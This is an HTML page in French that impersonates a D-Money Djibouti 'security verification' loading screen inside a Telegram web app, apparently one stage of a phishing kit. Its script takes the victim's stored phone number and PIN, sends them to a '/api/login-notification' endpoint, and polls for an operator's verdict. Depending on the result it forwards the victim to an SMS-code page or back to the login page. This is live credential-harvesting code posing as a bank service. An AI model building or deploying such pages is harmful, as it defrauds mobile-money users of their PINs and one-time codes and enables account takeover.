<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>D-Money Djibouti - Traitement</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --dmoney-yellow: #ffcc00; --dmoney-dark: #111111; --card-bg: #ffffff; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--dmoney-dark); margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .loading-card { background: var(--card-bg); width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; box-shadow: 0 12px 30px rgba(0,0,0,0.25); display: flex; flex-direction: column; align-items: center; border-top: 6px solid var(--dmoney-yellow); }
        .loader-circle { width: 110px; height: 110px; background: var(--dmoney-dark); border-radius: 50%; margin-bottom: 28px; display: flex; justify-content: center; align-items: center; border: 4px solid var(--dmoney-yellow); }
        .loader-circle::after { content: ''; width: 82px; height: 82px; border: 4px solid rgba(255, 255, 255, 0.2); border-top: 4px solid var(--dmoney-yellow); border-radius: 50%; animation: spin 1.2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #b45309; font-size: 24px; margin: 0 0 10px; font-weight: 800; }
        p { color: #666666; font-size: 15px; margin: 0; line-height: 1.5; }
    </style>
</head>
<body>
<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Traitement...</h2>
    <p id="sub-text">Vérification de sécurité...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");
    const tg = window.Telegram?.WebApp;
    if (tg) { tg.ready(); tg.expand(); }

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "DJ" })
        });
    } catch (err) { console.error(err); }

    async function checkApproval() {
        if (!phone) return;
        try {
            const res = await fetch(`/api/check-status?phone=${phone}`);
            const data = await res.json();
            
            if (data.status === "approved") {
                mainText.textContent = "Approuvé !";
                subText.textContent = "Ouverture de la vérification SMS...";
                setTimeout(() => { window.location.href = "/page8"; }, 1200);
            }
            else if (data.status === "pin_wrong") {
                mainText.textContent = "Code PIN incorrect !";
                subText.textContent = "Redirection vers la page de connexion...";
                setTimeout(() => { window.location.href = "/page6?error=wrongpin"; }, 1500);
            }
        } catch (err) { console.error(err); }
    }
    setInterval(checkApproval, 2000);
});
</script>
</body>
</html>
